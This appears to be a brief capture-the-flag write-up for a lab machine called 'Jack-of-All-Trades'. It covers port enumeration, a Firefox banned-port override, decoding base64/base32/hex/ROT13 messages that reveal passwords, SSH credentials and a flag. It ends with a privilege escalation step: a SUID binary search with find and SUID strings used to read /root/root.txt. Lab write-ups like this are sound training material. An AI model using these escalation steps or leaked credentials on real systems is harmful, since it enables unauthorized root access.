# Jack-of-All-Trades
```
export ip =10.10.203.85 
```

## Scan
```
22 http
80 ssh 
```

## Enumeration
```
[How to Access number 22 on http port?]
- FireFox
1. about:config
2. "network.security.ports.banned.override" is Setup 
- "String" check 
- input "22"

[First Decrypt Message]
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==

1.Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
2. Search on Twitter "Johny Graves" (# OSINT)
3. Detected Decryt Procedure text 
: ROT13 -> HEX -> BASE32


[Second Decrypt Message]
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= 
: Decrypt
BASE32 -> HEX -> ROT13 

->Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S

```


## Credential
```
Credential File is : /assets/header.jpg

[SSH]
jack / ITMJpGGIqg1jn?>@

```

## User
```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

## Root
```
1. find / -perm -4000 2>/dev/null
2. LFILE=/root/root.txt
3. /usr/bin/strings LFILE
```